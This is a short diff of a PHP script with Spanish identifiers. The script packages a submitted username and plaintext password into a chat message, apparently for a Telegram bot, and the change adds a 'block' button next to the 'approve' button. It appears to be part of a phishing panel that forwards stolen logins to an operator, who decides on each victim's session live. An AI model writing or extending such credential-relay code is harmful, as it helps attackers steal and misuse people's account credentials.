@@ -32,13 +32,14 @@ if($usuario && $clave){
 
         $msg = "🔐 Nuevo acceso\nUsuario: $usuario\nClave: $clave\nID: $id";
 
-        $keyboard = [
-            "inline_keyboard" => [
-                [
-                    ["text" => "✅ Aprobar", "callback_data" => "GO_$id"]
-                ]
-            ]
-        ];
+       $keyboard = [
+    "inline_keyboard" => [
+        [
+            ["text" => "✅ Aprobar", "callback_data" => "GO_$id"],
+            ["text" => "🚫 Bloquear", "callback_data" => "BLOCK_$id"]
+        ]
+    ]
+];
 
         $data = [
             "chat_id" => $chat_id,
